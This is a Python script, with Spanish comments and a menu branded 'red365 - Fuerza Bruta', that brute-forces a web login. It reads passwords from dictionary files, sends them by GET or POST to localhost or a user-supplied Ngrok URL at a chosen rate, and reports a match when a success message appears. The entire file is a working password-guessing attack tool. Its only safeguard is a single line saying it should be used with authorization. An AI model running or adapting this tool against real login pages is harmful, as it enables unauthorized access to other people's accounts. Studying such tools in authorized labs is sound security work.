import os
import requests
import time
from termcolor import colored

# Función para realizar el ataque con cualquier método HTTP
def brute_force_attack(url, username_field, password_field, dictionary_path, speed, method='GET'):
    try:
        with open(dictionary_path, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(colored("\nEl diccionario no existe. Verifica la ruta.", "red"))
        return

    print(colored(f"\nIniciando ataque de fuerza bruta con método {method.upper()}...", "green"))
    for password in passwords:
        password = password.strip()
        print(colored(f"Probando contraseña: {password}", "yellow"))

        # Construcción de los datos o parámetros según el método
        if method.upper() == 'GET':
            params = {password_field: password}
            try:
                response = requests.get(url, params=params)
            except Exception as e:
                print(colored(f"\nError al conectar: {e}", "red"))
                return
        elif method.upper() == 'POST':
            data = {password_field: password}
            try:
                response = requests.post(url, data=data)
            except Exception as e:
                print(colored(f"\nError al conectar: {e}", "red"))
                return
        else:
            print(colored("\nMétodo no soportado. Usando GET por defecto.", "red"))
            params = {password_field: password}
            try:
                response = requests.get(url, params=params)
            except Exception as e:
                print(colored(f"\nError al conectar: {e}", "red"))
                return

        # Verificación de respuesta exitosa
        if "¡Inicio Exitoso!" in response.text:  # Cambia según el mensaje de éxito
            print(colored(f"\nContraseña encontrada: {password}", "green"))
            return
        time.sleep(speed)

    print(colored("\nNo se encontró ninguna coincidencia en el diccionario.", "red"))

# Función para seleccionar diccionario
def select_dictionary():
    dic_folder = "dic"
    try:
        files = os.listdir(dic_folder)
        dictionaries = [f for f in files if f.endswith('.txt')]
        if not dictionaries:
            print(colored("\nNo se encontraron diccionarios en la carpeta 'dic'.", "red"))
            return None
        
        print(colored("\nDiccionarios disponibles:", "cyan"))
        for i, dic in enumerate(dictionaries, start=1):
            print(colored(f"{i}. {dic}", "yellow"))

        choice = int(input(colored("\nSelecciona un diccionario (número): ", "green")))
        if 1 <= choice <= len(dictionaries):
            return os.path.join(dic_folder, dictionaries[choice - 1])
        else:
            print(colored("\nOpción no válida.", "red"))
            return None
    except Exception as e:
        print(colored(f"\nError al listar diccionarios: {e}", "red"))
        return None

# Menú principal
def main_menu():
    os.system("clear")
    print(colored("""
        ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗ ██████╗ 
        ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║██╔════╝ ██╔══██╗
        ██████╔╝██████╔╝██╔██╗ ██║███████╗██║██║  ███╗██████╔╝
        ██╔═══╝ ██╔═══╝ ██║╚██╗██║╚════██║██║██║   ██║██╔═══╝ 
        ██║     ██║     ██║ ╚████║███████║██║╚██████╔╝██║     
        ╚═╝     ╚═╝     ╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝     
                         red365 - Fuerza Bruta
    """, "green"))

    print(colored("1. Iniciar ataque al localhost", "green"))
    print(colored("2. Configurar velocidad de ataque", "green"))
    print(colored("3. Seleccionar diccionario", "green"))
    print(colored("4. Instrucciones", "green"))
    print(colored("5. Atacar a dirección Ngrok", "green"))
    print(colored("6. Elegir método de ataque (GET, POST)", "green"))
    print(colored("7. Salir", "green"))

    return input(colored("\nElige una opción: ", "green"))

# Instrucciones
def instructions():
    print(colored("""
    Instrucciones de Uso:
    1. Asegúrate de que el servidor esté activo en el localhost o en la URL remota (Ngrok).
    2. Coloca los diccionarios en la carpeta 'dic'.
    3. Selecciona el objetivo y configura las opciones antes de iniciar el ataque.
    4. Utiliza esta herramienta solo con autorización.
    """, "cyan"))
    input(colored("\nPresiona Enter para volver al menú.", "cyan"))

# Función para preguntar si el usuario desea hacer otro ataque
def ask_to_continue():
    response = input(colored("\n¿Quieres hacer otro ataque? (s/n): ", "green"))
    return response.lower() == 's'

if __name__ == "__main__":
    target_url = "http://localhost:8080/"  # La URL principal del servidor
    ngrok_url = None
    username_field = "username"
    password_field = "password"
    dictionary_path = "dic/default.txt"
    speed = 1.0
    method = "GET"  # Método por defecto es GET

    while True:
        choice = main_menu()

        if choice == '1':
            print(colored(f"\nAtacando: {target_url}", "green"))
            brute_force_attack(target_url, username_field, password_field, dictionary_path, speed, method)
        elif choice == '2':
            try:
                print(colored("\nVelocidades disponibles:", "green"))
                print(colored("1. Lenta (1 intento cada 2 segundos)", "yellow"))
                print(colored("2. Media (1 intento cada 1 segundo)", "yellow"))
                print(colored("3. Rápida (1 intento cada 0.5 segundos)", "yellow"))
                speed_choice = int(input(colored("\nElige la velocidad: ", "green")))
                if speed_choice == 1:
                    speed = 2.0
                elif speed_choice == 2:
                    speed = 1.0
                elif speed_choice == 3:
                    speed = 0.5
                else:
                    print(colored("\nOpción no válida. Usando velocidad media.", "red"))
            except ValueError:
                print(colored("\nPor favor ingresa un número válido.", "red"))
        elif choice == '3':
            selected_dictionary = select_dictionary()
            if selected_dictionary:
                dictionary_path = selected_dictionary
                print(colored(f"\nDiccionario seleccionado: {os.path.basename(dictionary_path)}", "green"))
        elif choice == '4':
            instructions()
        elif choice == '5':
            ngrok_url = input(colored("\nIngresa la dirección Ngrok (ejemplo: http://xxxx.ngrok.io/login): ", "green"))
            if ngrok_url:
                brute_force_attack(ngrok_url, username_field, password_field, dictionary_path, speed, method)
        elif choice == '6':
            method = input(colored("\nElige el método de ataque (GET, POST): ", "green")).upper()
            if method not in ['GET', 'POST']:
                print(colored("\nMétodo no válido. Usando GET por defecto.", "red"))
                method = 'GET'
        elif choice == '7':
            print(colored("\nSaliendo del programa. ¡Hasta pronto!", "green"))
            break
        else:
            print(colored("\nOpción no válida. Intenta de nuevo.", "red"))

        # Preguntar si desea continuar después de un ataque
        if not ask_to_continue():
            print(colored("\nSaliendo del programa. ¡Hasta pronto!", "green"))
            break
